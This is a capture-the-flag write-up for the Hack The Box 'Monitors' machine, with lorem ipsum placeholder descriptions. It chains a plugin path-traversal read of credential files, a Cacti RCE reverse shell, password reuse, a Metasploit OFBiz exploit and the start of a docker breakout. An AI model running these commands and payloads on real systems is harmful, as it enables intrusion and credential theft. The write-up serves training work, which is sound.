@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.5.45">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2021-05-10">
+<meta name="description" content="Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.">
+
+<title>Monitors - Hack The Box</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+  <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml-full.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+const typesetMath = (el) => {
+  if (window.MathJax) {
+    // MathJax Typeset
+    window.MathJax.typeset([el]);
+  } else if (window.katex) {
+    // KaTeX Render
+    var mathElements = el.getElementsByClassName("math");
+    var macros = [];
+    for (var i = 0; i < mathElements.length; i++) {
+      var texText = mathElements[i].firstChild;
+      if (mathElements[i].tagName == "SPAN") {
+        window.katex.render(texText.data, mathElements[i], {
+          displayMode: mathElements[i].classList.contains('display'),
+          throwOnError: false,
+          macros: macros,
+          fleqn: false
+        });
+      }
+    }
+  }
+}
+window.Quarto = {
+  typesetMath
+};
+</script>
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../index.html"> 
+<span class="menu-text">Home</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Monitors - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">May 10, 2021</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar zindex-bottom">
+        
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<p><img src="images/monitors_logo.png" class="img-fluid"></p>
+<p>“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”</p>
+<hr>
+<p>██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝</p>
+<ol type="1">
+<li>[root:/git/htb/monitors]# nmap -Pn -n -sCV –open 10.10.10.238 (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA) | 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA) |_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn’t have a title (text/html; charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</li>
+</ol>
+<p>DIRB: —- Scanning URL: http://monitors.htb/ —- + http://monitors.htb/index.php (CODE:301|SIZE:0) + http://monitors.htb/server-status (CODE:403|SIZE:277) ==&gt; DIRECTORY: http://monitors.htb/wp-admin/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/ ==&gt; DIRECTORY: http://monitors.htb/wp-includes/ + http://monitors.htb/xmlrpc.php (CODE:405|SIZE:42)</p>
+<p>—- Entering directory: http://monitors.htb/wp-admin/ —- + http://monitors.htb/wp-admin/admin.php (CODE:302|SIZE:0) ==&gt; DIRECTORY: http://monitors.htb/wp-admin/css/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/images/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/includes/ + http://monitors.htb/wp-admin/index.php (CODE:302|SIZE:0) ==&gt; DIRECTORY: http://monitors.htb/wp-admin/js/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/maint/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/network/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/user/</p>
+<p>—- Entering directory: http://monitors.htb/wp-content/ —- + http://monitors.htb/wp-content/index.php (CODE:200|SIZE:0) ==&gt; DIRECTORY: http://monitors.htb/wp-content/languages/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/plugins/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/themes/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/upgrade/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/uploads/</p>
+<p>NIKTO: + Apache/2.4.29</p>
+<p>http://10.10.10.238: + ‘If you are having issues accessing the site then contact the website administrator: admin@monitors.htb’</p>
+<p>http://monitors.htb + written by admin + Powered by Wordpress + Searchbox - check for input validation?</p>
+<p>WPSCAN: [+] XML-RPC seems to be enabled: http://monitors.htb/xmlrpc.php | Found By: Link Tag (Passive Detection) | Confidence: 100% | Confirmed By: Direct Access (Aggressive Detection), 100% confidence | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</p>
+<p>[+] Upload directory has listing enabled: http://monitors.htb/wp-content/uploads/</p>
+<p>[+] The external WP-Cron seems to be enabled: http://monitors.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299</p>
+<p>[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).</p>
+<p>[+] WordPress theme in use: iconic-one | Location: http://monitors.htb/wp-content/themes/iconic-one/ | Last Updated: 2020-12-24T00:00:00.000Z | Readme: http://monitors.htb/wp-content/themes/iconic-one/readme.txt | [!] The version is out of date, the latest version is 2.1.9 | Style URL: http://monitors.htb/wp-content/themes/iconic-one/style.css?ver=1.7.8 | Style Name: Iconic One | Style URI: https://themonic.com/iconic-one/ | author: “0xPThree” description: Iconic One is a premium quality theme with pixel perfect typography and responsiveness and is built … | Author: Themonic | Author URI: https://themonic.com | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.1.7 (80% confidence) | Found By: Style (Passive Detection) | - http://monitors.htb/wp-content/themes/iconic-one/style.css?ver=1.7.8, Match: ‘Version: 2.1.7’</p>
+<p>[+] wp-with-spritz | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/ | Latest Version: 1.0 (up to date) | Last Updated: 2015-08-20T20:15:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 4.2.4 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt</p>
+<p>WORDPRESS ADMIN LOGIN: http://monitors.htb/wp-login.php</p>
+<ol start="2" type="1">
+<li>Googling on the plugin, wp spritz, there seem to be a LFI vulnerability. Download the python script and start enumerating the inside of the box. (Or simply use cURL)</li>
+</ol>
+<p>[root:/git/htb/monitors]# curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash Debian-snmp:x:112:115::/var/lib/snmp:/bin/false mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false</p>
+<p>Internal username is marcus.</p>
+<p>The WordPress password storage for the login passwords is fairly secure. The passwords are encrypted and stored in the WordPress MySQL database. However, the password for the WordPress MySQL database itself is stored in the wp-config.php file in plain text.</p>
+<p>[root:/git/htb/monitors]# curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php .. define( ‘DB_NAME’, ‘wordpress’ );</p>
+<p>/** MySQL database username */ define( ‘DB_USER’, ‘wpadmin’ );</p>
+<p>/** MySQL database password */ define( ‘DB_PASSWORD’, ‘BestAdministrator@2020!’ );</p>
+<p>/**#@+ * Authentication Unique Keys and Salts. <em> </em> Change these to different unique phrases! * You can generate these using the {<span class="citation" data-cites="link">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. <em> </em> <span class="citation" data-cites="since">@since</span> 2.6.0 <em>/ define( ‘AUTH_KEY’, ‘KkY%W@&gt;T}4CKTw5{.n_j3bywoB0k<sup>|OKX0{}5|UqZ2!VH!</sup>uWKJ.O oROc,h pp:’ ); define( ‘SECURE_AUTH_KEY’, ’</em>MHA-~&lt;-,<em>^<span class="math inline">\(raDR&amp;uxP)k(~`k/{PRT(6JliOO9XnYYbFU?Xmb#9USEjmgeHYYpm' );
+  define( 'LOGGED_IN_KEY',    ')F6L,A23Tbr9yhrhbgjDHJPJe?sCsDzDow-\)</span>E?zYCZ3</em>f40LSCIb] E%zrW@bs3/’ ); define( ‘NONCE_KEY’, ‘g?vl(p<span class="math inline">\({jG`JvDxVw-]#oUyd+uvFRO1tAUZQG_sGg&amp;Q7O-*tF[KIe\)</span>weE^$bB3%C’ ); define( ‘AUTH_SALT’, ‘8&gt;PIil3 7re_:3&amp;@<sup>8Zh|p</sup>I8rwT}WpVr5|t^ih05A:]xjTA,UVXa8ny:b–/[Jk’ ); define( ’SECURE_AUTH_SALT’, ’dN c^]m:4O|GyOK50hQ1tumg4&lt;JYlD2-,r,oq7GDjq4M Ri:x]Bod5L.S&amp;.hEGfv’ ); define( ‘LOGGED_IN_SALT’, ‘tCWVbTcE<em><em>T</em>}X3#t+:)&gt;N+D%?vVAIw#!</em>&amp;OK78M[@ YT0q):G~A:hTv<code>bO&lt;,|68' );   define( 'NONCE_SALT',       'sa&gt;i39)9&lt;vVyhE3auBVzl%=p23NJbl&amp;)*.{</code>&lt;*&gt;;R2=QHqj_a.%({D4yI-sy]D8,’ );</p>
+<p>/**#@-*/</p>
+<p>We have database creds (wpadmin:BestAdministrator@2020!) and keys+salts used for hashing the passwords. The password is not reused on either wp-admin nor SSH.</p>
+<p>After unsuccessfully testing out different RFI payloads for a while I had a look in ‘/etc/php/7.2/apache2/php.ini’ and noticed that ‘allow_url_fopen = On’ but ‘allow_url_include = Off’ - making RFI impossible.</p>
+<p>Download HackTrick’s LFI-list, and do a Hail Marry with Burp Intruder, sort by Length and we come across:</p>
+<p>/etc/apache2/sites-enabled/000-default.conf # Default virtual host settings # Add monitors.htb.conf # Add cacti-admin.monitors.htb.conf</p>
+<p>A new vhost! Add it to /etc/hosts.</p>
+<ol start="3" type="1">
+<li>On http://cacti-admin.monitors.htb we are presented with a login prompt, testing the creds admin:BestAdministrator@2020! give us successful login. We see that it’s running Cacti version 1.2.12.</li>
+</ol>
+<p>Googling for Cacti 1.2.12 exploits we find a python RCE. Downloading it and execute gives us a reverse shell!</p>
+<p>[root:/git/htb/monitors]# python3 cacti-rce.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! –lhost 10.10.14.12 –lport 4488 [+] Connecting to the server… [+] Retrieving CSRF token… [+] Got CSRF token: sid:97352a3ee6f8c68e07088e88d2e75ed5df8bc588,1620638867 [+] Trying to log in… [+] Successfully logged in!</p>
+<pre><code>[+] SQL Injection:
+"name","hex"
+"",""
+"admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
+"guest","43e9a4ab75570f5b"
+
+[+] Check your nc listener!</code></pre>
+<p>[root:/git/htb/monitors]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.12] from (UNKNOWN) [10.10.10.238] 38356 /bin/sh: 0: can’t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
+<p>Upgrade the shell; www-data@monitors:/usr/share/cacti/cacti$</p>
+<ol start="4" type="1">
+<li>We can try to dump the mysql database for WordPress, in order to crack the admin password.</li>
+</ol>
+<p>www-data@monitors:/usr/share/cacti/cacti$ mysqldump wordpress wp_users -u wpadmin -p Enter password: BestAdministrator@2020! .. LOCK TABLES <code>wp_users</code> WRITE; /<em>!40000 ALTER TABLE <code>wp_users</code> DISABLE KEYS </em>/; INSERT INTO <code>wp_users</code> VALUES (1,‘admin’,‘<span class="math inline">\(P\)</span>Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0’,‘admin’,‘admin@monitor.htb’,‘http://192.168.1.40’,‘2020-10-15 13:45:42’,‘1620579357:<span class="math inline">\(P\)</span>BPWRkUQGNxbjdPxyenG7IVioT6ri7t.’,0,‘admin’);</p>
+<p>[root:/git/htb/monitors]# hashcat -a0 -m400 admin.hash /usr/share/wordlists/rockyou.txt .. Session……….: hashcat Status………..: Exhausted Hash.Name……..: phpass Hash.Target……: <span class="math inline">\(P\)</span>Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0</p>
+<p>No luck.. instead go the normal route and upload linpeas.</p>
+<p>Listener: www-data@monitors:/dev/shm$ nc -lp 4433 &gt; linpeas.sh Transfer: [root:/opt/scanners/linux]# nc -w3 10.10.10.238 4433 &lt; linpeas.sh</p>
+<p>Running linpeas doesn’t give anything of real use however.. Moving on and manually looking in /home/marcus we see the directory .backup, but we lack privs to see what’s in it.</p>
+<p>www-data@monitors:/home/marcus$ ls -al total 40 drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 . drwxr-xr-x 3 root root 4096 Nov 10 17:00 .. d–x–x–x 2 marcus marcus 4096 Nov 10 18:21 .backup lrwxrwxrwx 1 root root 9 Nov 10 18:30 .bash_history -&gt; /dev/null -rw-r–r– 1 marcus marcus 220 Apr 4 2018 .bash_logout -rw-r–r– 1 marcus marcus 3771 Apr 4 2018 .bashrc drwx—— 2 marcus marcus 4096 Jan 25 15:39 .cache drwx—— 3 marcus marcus 4096 Nov 10 17:00 .gnupg -rw-r–r– 1 marcus marcus 807 Apr 4 2018 .profile -r–r—– 1 root marcus 84 Jan 25 14:59 note.txt -r–r—– 1 root marcus 33 May 9 15:30 user.txt</p>
+<p>We can search the entire system to see if there are any file or service that have an absolute path to ‘/home/marcus/.backup’ NOTE: This is very unoptimized and will take several minutes.</p>
+<p>www-data@monitors:/$ grep -Ril “/home/marcus/.backup” 2&gt; /dev/null /etc/systemd/system/cacti-backup.service</p>
+<p>www-data@monitors:/$ cat /etc/systemd/system/cacti-backup.service [Unit] Description=Cacti Backup Service After=network.target</p>
+<pre><code>[Service]
+Type=oneshot
+User=www-data
+ExecStart=/home/marcus/.backup/backup.sh
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+<p>Lets try if we can read the file backup.sh: www-data@monitors:/$ cat /home/marcus/.backup/backup.sh #!/bin/bash</p>
+<pre><code>backup_name="cacti_backup"
+config_pass="VerticalEdge2020"
+
+zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
+sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
+rm /tmp/${backup_name}.zip</code></pre>
+<p>A new set of creds! cacti_backup:VerticalEdge2020 - lets try if user marcus use the same password.</p>
+<p>www-data@monitors:/$ su marcus Password: VerticalEdge2020 marcus@monitors:/$ id uid=1000(marcus) gid=1000(marcus) groups=1000(marcus) marcus@monitors:/$ cat /home/marcus/user.txt 20914feda0c2c461a15461b4a650c321</p>
+<p>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████</p>
+<p>██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝</p>
+<ol type="1">
+<li>We saw earlier note.txt in marcus home directory, lets check it out!</li>
+</ol>
+<p>marcus@monitors:~$ cat note.txt TODO:</p>
+<pre><code>Disable phpinfo in php.ini      - DONE
+Update docker image for production use  -</code></pre>
+<p>Okay, so the way to root is probably related to the docker image, where ever that is. Run linpeas to see if there are any local services running.</p>
+<p>================================( Processes, Cron, Services, Timers &amp; Sockets )================================ [+] Cleaned processes .. root 1597 0.0 1.9 975760 76932 ? Ssl May09 0:12 /usr/bin/dockerd -H fd:// –containerd=/run/containerd/containerd.sock root 2096 0.0 0.1 627100 5328 ? Sl May09 0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443 root 2112 0.0 0.1 108820 4756 ? Sl May09 0:02 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/b19c764b5ef0d32990e4695ff1f63de830ff77d3a4873daaa411007fb700d8f0 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc root 2141 0.0 2.0 3410072 80992 ? Ssl May09 1:02 /usr/local/openjdk-8/bin/java -Dorg.gradle.appname=gradlew -classpath /usr/src/apache-ofbiz-17.12.01/gradle/wrapper/gradle-wrapper.jar org.gradle.wrapper.GradleWrapperMain –offline ofbiz .. [+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name .. tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN -</p>
+<ol start="2" type="1">
+<li>Port 8443 is running locally, setup a SSH tunnel to enumerate the service.</li>
+</ol>
+<p>[root:/git/htb/monitors]# ssh -L 8443:127.0.0.1:8443 marcus@monitors.htb [root:/opt/scanners/linux]# lsof -i -P -n | grep LISTEN .. ssh 36606 root 4u IPv6 322213 0t0 TCP [::1]:8443 (LISTEN) ssh 36606 root 5u IPv4 322214 0t0 TCP 127.0.0.1:8443 (LISTEN)</p>
+<p>Browsing to https://127.0.0.1:8443 we get a 404 - Not Found. Run a fuzzer (ffuf) to see if we can find a entry point.</p>
+<p>[root:/opt/scanners/linux]# ffuf -c -w /usr/share/wordlists/dirb/common.txt -u https://127.0.0.1:8443/FUZZ accounting [Status: 302, Size: 0, Words: 1, Lines: 1] ap [Status: 302, Size: 0, Words: 1, Lines: 1] ar [Status: 302, Size: 0, Words: 1, Lines: 1] catalog [Status: 302, Size: 0, Words: 1, Lines: 1] common [Status: 302, Size: 0, Words: 1, Lines: 1] content [Status: 302, Size: 0, Words: 1, Lines: 1] ebay [Status: 302, Size: 0, Words: 1, Lines: 1] ecommerce [Status: 302, Size: 0, Words: 1, Lines: 1] example [Status: 302, Size: 0, Words: 1, Lines: 1] images [Status: 302, Size: 0, Words: 1, Lines: 1] marketing [Status: 302, Size: 0, Words: 1, Lines: 1] passport [Status: 302, Size: 0, Words: 1, Lines: 1]</p>
+<p>Trying https://127.0.0.1:8443/accounting forwards us to a login prompt for OFBiz release 17.12.01. Googling about OFBiz 17.12.01 we find that there are a deserialization vuln leading to RCE (CVE-2020-9496), and there’s even a metasploit module for it.</p>
+<p>[root:/git/htb/monitors]# msfdb run msf6 &gt; use exploit/linux/http/apache_ofbiz_deserialization msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; set rhosts 127.0.0.1 msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; set lhost 10.10.14.12 msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; set forceexploit true msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; set payload linux/x64/shell/reverse_tcp (original meterpreter is slow) msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; run .. [*] Command shell session 2 opened (10.10.14.12:8443 -&gt; 10.10.10.238:56372) at 2021-05-10 16:16:18 +0200 [*] Server stopped.</p>
+<pre><code>id
+  uid=0(root) gid=0(root) groups=0(root)
+hostname
+  b19c764b5ef0
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@b19c764b5ef0:/usr/src/apache-ofbiz-17.12.01#
+root@b19c764b5ef0:/usr/src/apache-ofbiz-17.12.01# ip a
+  5: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
+      link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+      inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+         valid_lft forever preferred_lft forever</code></pre>
+<ol start="3" type="1">
+<li>We’re now connected to the container host (172.17.0.2). I would assume that the task here is to break out of the docker container in order to get root.txt. After some googling I found a blogpost from pentesteracademy.com where they take a step by step tutorial for breaking out by abusing SYS_MODULE.</li>
+</ol>
+<p>Start by checking the capabilities provided to the docker container:</p>
+<p>root@b19c764b5ef0:/usr/src/apache-ofbiz-17.12.01# capsh –print Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap Securebits: 00/0x0/1’b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked) uid=0(root) gid=0(root) groups=</p>
+<p>We see that our docker has ‘cap_sys_module’, as a result the container can insert/remove kernel modules in/from the kernel of the docker host machine - aka monitors.htb.</p>
+<p>Follow the steps to create a reverse shell using usermode Helper API. NOTE: Change IP to 172.17.0.1 (docker0 interface of monitors.htb) and port to whatever you like.</p>
